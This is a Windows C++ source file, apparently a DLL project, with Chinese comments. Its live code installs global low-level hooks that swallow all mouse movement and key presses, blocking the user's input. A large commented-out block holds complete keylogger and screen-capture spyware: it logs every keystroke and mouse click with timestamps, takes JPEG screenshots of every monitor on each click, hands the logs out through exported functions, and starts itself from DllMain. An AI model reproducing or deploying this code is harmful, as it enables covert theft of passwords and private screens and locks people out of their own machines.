// pch.cpp: 与预编译标头对应的源文件

#include "pch.h"

// 当使用预编译的头时，需要使用此源文件，编译才能成功。

HMODULE g_hModule;
HHOOK g_hMouseHook1;
HHOOK g_hKeyHook1;

void SetModule(HMODULE hModule)
{
	g_hModule = hModule;
}

BOOL InstallMouseHook()
{
	g_hMouseHook1 = SetWindowsHookEx(WH_MOUSE_LL, Mouse_Proc,0, 0);
	if (g_hMouseHook1)
	{
		return true;
	}
	return false; 
}

BOOL InstallKeyHook()
{
	g_hKeyHook1 = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoard_Proc,0, 0);
	if (g_hKeyHook1)
	{
		return true;
	}
	return false;
}

//钩子函数
LRESULT CALLBACK Mouse_Proc(int nCode, WPARAM wParam, LPARAM lParam)
{
	LPMOUSEHOOKSTRUCT mhs = (LPMOUSEHOOKSTRUCT)lParam;
	switch (wParam)
	{
	case WM_MOUSEMOVE:
		return 1;
	}
	return CallNextHookEx(g_hMouseHook1, nCode, wParam, lParam);
}

//键盘钩子函数
LRESULT CALLBACK KeyBoard_Proc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (wParam == WM_KEYDOWN)
	{
		return 1;
	}
	return CallNextHookEx(g_hKeyHook1, nCode, wParam, lParam);
}

////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////
/*
#include<iostream>
#include<chrono>
#include<mutex>
#include<ctime>
#include<cstdint>
#include<string>
#include<list>
#include<vector>
#include<fstream>
#include<Windows.h>
#include<gdiplus.h>
#include<direct.h>
#include<Shlwapi.h>

using namespace Gdiplus;

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ole32.lib")

//========================================================================
// api
//========================================================================

extern "C" __declspec(dllexport) void get_key_log(const void * p, void * a);
extern "C" __declspec(dllexport) void get_mouse_log(const void * p, void * a);
extern "C" __declspec(dllexport) void get_ss_log(const void * p, void * a);

//========================================================================
// internal
//========================================================================

namespace {

	std::chrono::time_point<std::chrono::steady_clock> begin;
	std::list<std::string> key_log;
	std::list<std::string> mouse_log;
	std::list<std::vector<char>> screen_shot_log;
	std::mutex mtx_key;
	std::mutex mtx_mouse;
	std::mutex mtx_ss;

	int get_encoder(const WCHAR* format, CLSID* pClsid) {
		UINT num, size;
		GetImageEncodersSize(&num, &size);
		ImageCodecInfo* pci = (ImageCodecInfo*)(malloc(size));
		GetImageEncoders(num, size, pci);
		for (UINT i = 0; i < num; i++) {
			if (wcscmp(pci[i].MimeType, format) == 0) {
				*pClsid = pci[i].Clsid;
				free(pci);
				return 0;
			}
		}
		free(pci);
		return -1;
	}

	int save_bmp_as_jpg(HBITMAP hbmp) {
		size_t ret = 0;
		Bitmap* pbmp = Bitmap::FromHBITMAP(hbmp, NULL);
		CLSID clsid;
		if (get_encoder(L"image/jpeg", &clsid) < 0) {
			return -1;
		}
		Gdiplus::EncoderParameters encoderParameters;
		encoderParameters.Count = 1;
		encoderParameters.Parameter[0].Guid = Gdiplus::EncoderQuality;
		encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
		encoderParameters.Parameter[0].NumberOfValues = 1;
		ULONG quality = 50;
		encoderParameters.Parameter[0].Value = &quality;
		HGLOBAL global = GlobalAlloc(GMEM_MOVEABLE, 0);
		IStream* stream = NULL;
		CreateStreamOnHGlobal(global, TRUE, &stream);
		pbmp->Save(stream, &clsid, &encoderParameters);
		auto size = GlobalSize(global);
		std::vector<char> raw;
		raw.resize(size);
		memcpy(&raw[0], GlobalLock(global), size);
		{
			std::unique_lock<std::mutex> lock(mtx_ss);
			screen_shot_log.push_back(std::move(raw));
		}
		delete pbmp;
		stream->Release();
		return 0;

	}

	int save_image(RECT & rect, HDC hdc) {
		UINT width = rect.right - rect.left;
		UINT height = rect.bottom - rect.top;
		HDC hmdc = CreateCompatibleDC(hdc);
		HBITMAP hbmp = CreateCompatibleBitmap(hdc, width, height);
		HBITMAP hbmpOld = (HBITMAP)SelectObject(hmdc, hbmp);
		BitBlt(hmdc, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
		SelectObject(hmdc, hbmpOld);
		if (save_bmp_as_jpg(hbmp) < 0) return -1;
		DeleteObject(hbmp);
		DeleteDC(hmdc);
		return 0;
	}

	int ss_each_monitor(RECT & rect, HDC hdc) {
		if (save_image(rect, hdc) < 0) return -1;
		return 0;
	}

	BOOL _func(HMONITOR hMonitor, HDC hdc, LPRECT lprcMonitor, LPARAM dwData) {
		ss_each_monitor(*lprcMonitor, hdc);
		return TRUE;
	}

	int screen_shot() {
		auto hdc = GetDC(NULL);
		EnumDisplayMonitors(hdc, NULL, (MONITORENUMPROC)_func, NULL);
		ReleaseDC(NULL, hdc);
		return 0;
	}

	void timestamp(std::string & s) {
		auto now = std::chrono::steady_clock::now();
		auto h = std::chrono::duration_cast<std::chrono::hours>(now - begin);
		auto m = std::chrono::duration_cast<std::chrono::minutes>(now - begin);
		auto sec = std::chrono::duration_cast<std::chrono::seconds>(now - begin);
		auto msec = std::chrono::duration_cast<std::chrono::milliseconds>(now - begin);
		static char buf[4096];
		memset(buf, 0, 4096);
		sprintf_s(buf, "h:%d,m:%d,s:%llu,ms:%llu ", h.count(), m.count(), sec.count(), msec.count());
		s += buf;
	}

	LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
		if (nCode == HC_ACTION) {
			switch (wParam) {
			case WM_KEYDOWN:
			case WM_SYSKEYDOWN: {
				auto p = (KBDLLHOOKSTRUCT*)lParam;
				std::string s;
				static char buf[4096];
				memset(buf, 0, 4096);
				timestamp(s);
				UINT scanCode = MapVirtualKey(p->vkCode, MAPVK_VK_TO_VSC);
				TCHAR szName[128];
				int result = 0;
				switch (p->vkCode) {
				case VK_LEFT: case VK_UP: case VK_RIGHT: case VK_DOWN:
				case VK_PRIOR: case VK_NEXT:
				case VK_END: case VK_HOME:
				case VK_INSERT: case VK_DELETE:
				case VK_DIVIDE:
				case VK_NUMLOCK:
					scanCode |= KF_EXTENDED;
				default:
					result = GetKeyNameText(scanCode << 16, szName, 128);
				}
				sprintf_s(buf, "%s\n", szName);
				s += buf;
				{
					std::lock_guard<std::mutex> lock(mtx_key);
					key_log.push_back(s);
				}
				break;
			}
			}
		}
		return nCode < 0 ? CallNextHookEx(NULL, nCode, wParam, lParam) : nCode;
	}

	LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
		if (nCode == HC_ACTION) {
			switch (wParam) {
			case WM_LBUTTONUP:
			case WM_RBUTTONUP: {
				auto p = (MSLLHOOKSTRUCT*)lParam;
				std::string s;
				static char buf[4096];
				memset(buf, 0, 4096);
				timestamp(s);
				sprintf_s(buf, "[%s]%d %d\n", wParam == WM_LBUTTONUP ? "lm" : "rm", p->pt.x, p->pt.y);
				s += buf;
				{
					std::lock_guard<std::mutex> lock(mtx_mouse);
					mouse_log.push_back(s);
				}
				screen_shot();
				break;
			}
			}
		}
		return nCode < 0 ? CallNextHookEx(NULL, nCode, wParam, lParam) : nCode;
	}
}

//========================================================================
// api
//========================================================================

extern "C" __declspec(dllexport) void get_key_log(const void * p, void * a) {
	if (!p) return;
	std::lock_guard<std::mutex> lock(mtx_key);
	auto f = (void(*)(const char*, void *))p;
	for (auto & i : key_log) f(i.c_str(), a);
	key_log.clear();
}

extern "C" __declspec(dllexport) void get_mouse_log(const void * p, void * a) {
	if (!p) return;
	std::lock_guard<std::mutex> lock(mtx_mouse);
	auto f = (void(*)(const char*, void *))p;
	for (auto & i : mouse_log) f(i.c_str(), a);
	mouse_log.clear();
}

extern "C" __declspec(dllexport) void get_ss_log(const void * p, void * a) {
	if (!p) return;
	std::lock_guard<std::mutex> lock(mtx_ss);
	auto f = (void(*)(const char*, size_t, void *))p;
	for (auto & i : screen_shot_log) f(&i[0], i.size(), a);
	screen_shot_log.clear();
}

//========================================================================
// main
//========================================================================

int main(int argc, char ** argv) {
	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken = NULL;
	Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
	begin = std::chrono::steady_clock::now();
	auto hk = SetWindowsHookEx(WH_KEYBOARD_LL, ::LowLevelKeyboardProc, 0, 0);
	auto hm = SetWindowsHookEx(WH_MOUSE_LL, ::LowLevelMouseProc, 0, 0);
	MSG msg;
	while (!GetMessage(&msg, NULL, NULL, NULL)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return EXIT_SUCCESS;
}
*/
/*
BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved) {
	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
		main(0, nullptr);
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	default:
		main(0, nullptr);
		break;
	}
	return TRUE;
}
*/